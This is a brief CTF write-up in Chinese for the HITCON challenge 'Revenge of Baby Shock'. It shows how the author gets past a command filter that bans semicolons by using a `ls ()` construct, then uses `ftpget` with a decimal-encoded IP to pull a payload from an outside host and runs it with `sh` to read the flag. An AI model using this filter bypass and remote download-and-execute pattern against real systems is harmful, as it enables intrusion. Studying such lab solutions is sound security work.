# Revenge of Baby Shock

看起來前面那題解法是非預期解(?

這次把分號擋掉了

踹了一波加上上題flag，發現 command 有 `()`時，行為會很詭異

最後發現 `ls ()wget` 這樣可以執行任意指令

但是輸入有限制，特殊符號只能用這幾個 `!,=#():+_^`

雖然 `wget` 可以用十進位 ip 繞，但是載下來的檔案是 `index.html`，名字的 `.` 不好繞

最後發現有 `ftpget` 可以用，輕鬆控任意下載檔名

```
> ls ()ftpget 921608994:10001 meow123 meow123
> ls ()sh meow123
```

`/readflag` => `hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}`

